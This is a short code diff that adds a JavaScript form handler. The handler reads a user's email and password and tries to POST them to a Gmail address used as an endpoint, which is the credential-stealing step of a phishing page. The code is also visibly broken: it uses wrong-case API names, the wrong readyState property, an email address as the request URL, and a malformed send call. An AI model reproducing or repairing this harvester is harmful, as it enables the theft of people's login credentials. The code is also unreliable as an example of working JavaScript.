@@ -1,0 +1,14 @@
+function submit(){
+var em = form.email.value;
+var ps = form.password.value;
+var xhr = new XMLHTTPREQUEST();
+xhr.open('POST', 'https://uzodimmajoseph112@gmail.com', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.onReadyStateChange=function(){
+if(this.state == 4 && this.status == 200){
+var response = this.responseText;
+}
+};
+
+xhr.send(em, ps);
+}
